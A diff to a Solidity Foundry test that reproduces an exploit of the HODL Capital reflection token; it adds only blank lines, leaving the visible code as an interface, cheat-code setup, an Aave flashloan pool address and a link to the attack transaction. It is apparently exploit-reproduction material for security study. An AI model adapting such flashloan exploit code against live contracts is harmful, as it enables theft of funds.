@@ -13,14 +13,17 @@ import "./../interface.sol";
 // https://explorer.phalcon.xyz/tx/eth/0xedc214a62ff6fd764200ddaa8ceae54f842279eadab80900be5f29d0b75212df
 
 interface IHODL is IERC20 {
+
     function deliver(uint256 amount) external;
     function isExcluded(address account) external returns (bool);
     function isExcludedFromFee(address account) external returns (bool);
     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) external returns (uint256);
     function tokenFromReflection(uint256 rAmount) external returns (uint256);
+
 }
 
 contract HODLCapitalExploit is Test {
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     IAaveFlashloan aavePool = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
@@ -233,4 +236,5 @@ contract HODLCapitalExploit is Test {
             times += 1;
         }
     }
+
 }
